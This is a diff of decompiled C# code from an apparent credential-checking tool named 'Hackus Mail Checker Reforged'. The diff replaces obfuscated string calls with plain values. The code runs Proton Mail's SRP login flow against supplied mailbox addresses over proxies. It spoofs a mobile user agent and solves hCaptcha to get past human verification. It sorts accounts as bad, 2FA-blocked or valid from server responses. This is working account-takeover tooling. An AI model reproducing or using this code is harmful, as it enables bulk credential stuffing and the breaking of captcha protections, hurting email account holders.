@@ -76,7 +76,7 @@ namespace Hackus_Mail_Checker_Reforged.Net
 							{
 								continue;
 							}
-							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveHCaptcha(this._siteKey, _Module_.smethod_2<string>(1490708811), _Module_.smethod_5<string>(1482021352));
+							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveHCaptcha(this._siteKey, "https://account.proton.me/login", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1");
 							OperationResult item = valueTuple.Item1;
 							string item2 = valueTuple.Item2;
 							if (item == OperationResult.Error)
@@ -117,31 +117,31 @@ namespace Hackus_Mail_Checker_Reforged.Net
 				using (HttpRequest httpRequest = new HttpRequest())
 				{
 					this.SetHeaders(httpRequest);
-					httpRequest.AddHeader(_Module_.smethod_6<string>(-452519608), _Module_.smethod_2<string>(941257502));
-					httpRequest.AddHeader(_Module_.smethod_6<string>(890714211), _Module_.smethod_2<string>(2023840275));
-					httpRequest.AddHeader(_Module_.smethod_2<string>(225883637), _Module_.smethod_5<string>(-1793646419));
-					httpRequest.AddHeader(_Module_.smethod_2<string>(-1155904558), _Module_.smethod_3<string>(-81245960));
-					string text = _Module_.smethod_4<string>(-1450036325) + this._mailbox.Address + _Module_.smethod_2<string>(-1185720978);
-					string input = httpRequest.Post(_Module_.smethod_6<string>(-1330641654), text, _Module_.smethod_4<string>(-423852883)).ToString();
-					Match match = Regex.Match(input, _Module_.smethod_4<string>(-1817916597));
+					httpRequest.AddHeader("Accept", "application/vnd.protonmail.v1+json");
+					httpRequest.AddHeader("x-pm-appversion", "WebVPNSettings_4.7.0");
+					httpRequest.AddHeader("x-pm-apiversion", "3");
+					httpRequest.AddHeader("x-pm-locale", "en_US");
+					string text = "{\"Username\":\"" + this._mailbox.Address + "\"}";
+					string input = httpRequest.Post("https://account.proton.me/api/auth/info", text, "application/json").ToString();
+					Match match = Regex.Match(input, "\"Modulus\":\"(.+?)\"");
 					if (!match.Success)
 					{
 						return OperationResult.Error;
 					}
-					this._modulus = match.Groups[1].Value.Replace(_Module_.smethod_3<string>(780725584), _Module_.smethod_6<string>(-1253514038));
-					match = Regex.Match(input, _Module_.smethod_4<string>(-1377299533));
+					this._modulus = match.Groups[1].Value.Replace("\\n", "");
+					match = Regex.Match(input, "\"SRPSession\":\"(.+?)\"");
 					if (!match.Success)
 					{
 						return OperationResult.Error;
 					}
 					this._srpSession = match.Groups[1].Value;
-					match = Regex.Match(input, _Module_.smethod_4<string>(375552085));
+					match = Regex.Match(input, "\"Salt\":\"(.+?)\"");
 					if (!match.Success)
 					{
 						return OperationResult.Error;
 					}
 					this._salt = match.Groups[1].Value;
-					match = Regex.Match(input, _Module_.smethod_6<string>(-1780794096));
+					match = Regex.Match(input, "\"ServerEphemeral\":\"(.+?)\"");
 					if (!match.Success)
 					{
 						return OperationResult.Error;
@@ -174,14 +174,14 @@ namespace Hackus_Mail_Checker_Reforged.Net
 				using (HttpRequest httpRequest = new HttpRequest())
 				{
 					this.SetHeaders(httpRequest);
-					httpRequest.AddHeader(_Module_.smethod_2<string>(-1163952921), _Module_.smethod_3<string>(-223744174));
-					httpRequest.AddHeader(_Module_.smethod_2<string>(-57001940), _Module_.smethod_4<string>(564300540));
-					httpRequest.AddHeader(_Module_.smethod_4<string>(-1977815138), _Module_.smethod_6<string>(1928384819));
-					httpRequest.AddHeader(_Module_.smethod_3<string>(138019134), _Module_.smethod_6<string>(727706079));
+					httpRequest.AddHeader("Accept", "application/vnd.protonmail.v1+json");
+					httpRequest.AddHeader("x-pm-appversion", "WebVPNSettings_4.7.0");
+					httpRequest.AddHeader("x-pm-apiversion", "3");
+					httpRequest.AddHeader("x-pm-locale", "en_US");
 					if (token != null)
 					{
-						httpRequest.AddHeader(_Module_.smethod_6<string>(1923195464), _Module_.smethod_5<string>(-418286942));
-						httpRequest.AddHeader(_Module_.smethod_6<string>(2070939898), this._humanVerificationToken + _Module_.smethod_4<string>(-1213116943) + this._sendToken + token);
+						httpRequest.AddHeader("x-pm-human-verification-token-type", "captcha");
+						httpRequest.AddHeader("x-pm-human-verification-token", this._humanVerificationToken + ":" + this._sendToken + token);
 					}
 					string text = JsonConvert.SerializeObject(new
 					{
@@ -190,10 +190,10 @@ namespace Hackus_Mail_Checker_Reforged.Net
 						SRPSession = this._srpSession,
 						Username = this._mailbox.Address
 					});
-					string text2 = httpRequest.Post(_Module_.smethod_6<string>(739510207), text, _Module_.smethod_4<string>(-423852883)).ToString();
-					if (text2.Contains(_Module_.smethod_5<string>(-991717833)))
+					string text2 = httpRequest.Post("https://account.proton.me/api/auth", text, "application/json").ToString();
+					if (text2.Contains("HumanVerificationToken"))
 					{
-						Match match = Regex.Match(text2, _Module_.smethod_4<string>(-1198167716));
+						Match match = Regex.Match(text2, "\"HumanVerificationToken\":\"(.+?)\"");
 						if (match.Success)
 						{
 							this._humanVerificationToken = match.Groups[1].Value;
@@ -202,28 +202,28 @@ namespace Hackus_Mail_Checker_Reforged.Net
 					}
 					if (text2.ContainsOne(new string[]
 					{
-						_Module_.smethod_2<string>(176924102),
-						_Module_.smethod_5<string>(1023833071)
+						"Incorrect login credentials",
+						"\"Code\":2000,"
 					}))
 					{
 						return OperationResult.Bad;
 					}
 					if (text2.ContainsOne(new string[]
 					{
-						_Module_.smethod_2<string>(875978122),
-						_Module_.smethod_3<string>(-140996569),
-						_Module_.smethod_2<string>(-122281320),
-						_Module_.smethod_2<string>(-1920237958),
-						_Module_.smethod_2<string>(160604257)
+						"\"Code\":10001,",
+						"\"Code\":10003,",
+						"\"2FA\":{\"Enabled\":1",
+						"\"TwoFactor\":1",
+						"\"TOTP\":1"
 					}))
 					{
 						return OperationResult.Blocked;
 					}
 					if (!text2.ContainsOne(new string[]
 					{
-						_Module_.smethod_4<string>(-147418409),
-						_Module_.smethod_3<string>(-1224359054),
-						_Module_.smethod_2<string>(27321391)
+						"\"Code\":1000,",
+						"\"Uid\":\"",
+						"\"UID\":"
 					}))
 					{
 						return OperationResult.Error;
@@ -250,16 +250,16 @@ namespace Hackus_Mail_Checker_Reforged.Net
 				using (HttpRequest httpRequest = new HttpRequest())
 				{
 					this.SetHeaders(httpRequest);
-					httpRequest.AddUrlParam(_Module_.smethod_2<string>(1275826720), this._humanVerificationToken);
-					httpRequest.AddUrlParam(_Module_.smethod_3<string>(751880135), 1);
-					string input = httpRequest.Get(_Module_.smethod_5<string>(-1947435358), null).ToString();
-					Match match = Regex.Match(input, _Module_.smethod_4<string>(400205687));
+					httpRequest.AddUrlParam("Token", this._humanVerificationToken);
+					httpRequest.AddUrlParam("ForceWebMessaging", 1);
+					string input = httpRequest.Get("https://account-api.proton.me/core/v4/captcha", null).ToString();
+					Match match = Regex.Match(input, "publicKey = \"(.+?)\"");
 					if (!match.Success)
 					{
 						return OperationResult.Error;
 					}
 					this._siteKey = match.Groups[1].Value;
-					match = Regex.Match(input, _Module_.smethod_2<string>(-1596565164));
+					match = Regex.Match(input, "sendToken\\(\\'(.+?)\\'\\+\\'(.+?)\\'");
 					if (match.Success)
 					{
 						this._sendToken = match.Groups[1].Value + match.Groups[2].Value;
@@ -285,7 +285,7 @@ namespace Hackus_Mail_Checker_Reforged.Net
 			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
 			request.Cookies = this._cookies;
 			request.Proxy = this._proxyClient;
-			request.UserAgent = _Module_.smethod_2<string>(900569449);
+			request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1";
 		}
 
 		// Token: 0x0600057A RID: 1402 RVA: 0x00009BE8 File Offset: 0x00007DE8
